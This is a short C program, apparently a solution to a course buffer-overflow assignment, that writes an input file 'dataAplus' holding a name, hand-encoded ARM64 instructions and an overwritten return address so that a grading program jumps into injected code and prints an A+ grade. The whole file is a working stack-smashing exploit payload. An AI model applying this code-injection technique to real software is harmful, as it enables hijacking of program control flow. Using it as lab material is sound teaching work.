#include <stdio.h>

int main(void)
{
    FILE *psFile;
    unsigned long ulData1;
    unsigned int uiData2;
    unsigned int uiData3;
    unsigned int uiData4;

    ulData1 = 0x420068; /* address to the instructions below; */
    uiData2 = 0x528001E1; /* mov w1, #0x0A */
    uiData3 = 0x10000040; /* adr x0, 0x420074 */
    uiData4 = 0x17FF8201; /* b 0x400874 */

    psFile = fopen("dataAplus", "w");

    /* buf[0-15] */
    fprintf(psFile, "Max and Melody");
    putc('\0', psFile);
    putc('\0', psFile);
    /* buf[16-19] */
    fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
    /* buf[20-23] */
    fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
    /* buf[24-27] */
    fwrite(&uiData4, sizeof(unsigned int), 1, psFile);
    /* buf[28-47] */
    fprintf(psFile, "A+ is your grade.");
    putc('%', psFile);
    putc('c', psFile);
    putc('\0', psFile);
    /* buf[48-55] (main return address) */
    fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
    /* buf[56] (newline in unused memory) */
    putc('\n', psFile);
    return 0;
}